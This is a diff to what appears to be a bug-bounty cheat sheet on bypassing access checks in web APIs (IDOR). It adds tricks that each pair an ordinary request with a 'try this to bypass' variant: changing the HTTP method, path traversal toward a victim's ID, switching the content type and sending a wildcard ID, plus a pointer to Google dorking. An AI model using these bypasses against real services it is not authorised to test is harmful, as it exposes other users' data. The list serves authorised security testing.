@@ -114,5 +114,43 @@ Try this to bypass
 GET /file?id=302
 ```
 
+12. Change HTTP Method
+```
+GET /api/v1/users/profile/111
+```
+Try this to bypass
+```
+POST /api/v1/users/profile/111
+```
+
+13. Path traversal
+```
+GET /api/v1/users/profile/victim_id
+```
+Try this to bypass
+```
+GET /api/v1/users/profile/my_id/../victim_id
+```
+
+14. Change request content type
+```
+Content-type: application/xml
+```
+Try this to bypass
+```
+Content-type: application/json
+```
+
+15. Send wildcard instead of ID
+```
+GET /api/users/111
+```
+Try this to bypass
+```
+GET /api/users/*
+```
+
+16. Try google dorking to find new endpoint
+
 Reference: 
 - [@swaysThinking](https://twitter.com/swaysThinking) and other medium writeup
